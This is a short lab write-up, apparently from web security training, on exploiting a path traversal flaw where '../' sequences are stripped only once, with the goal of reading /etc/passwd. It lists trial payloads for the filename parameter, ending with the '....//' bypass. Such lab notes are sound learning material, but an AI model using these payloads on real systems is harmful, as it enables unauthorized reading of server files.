@@ -1,0 +1,17 @@
+Lab #3 - File path traversal, traversal sequences stripped non-recursively
+
+Target Goal - Retrieve the contents of the /etc/passwd file.
+
+Analysis:
+
+This is the potential directory path where the app may store the image files:
+/var/www/images/
+
+experimenting the payloads on the vulerable filename parameter :
+
+/etc/passwd
+
+../../../etc/passwd
+
+....//....//....//....//etc/passwd
+
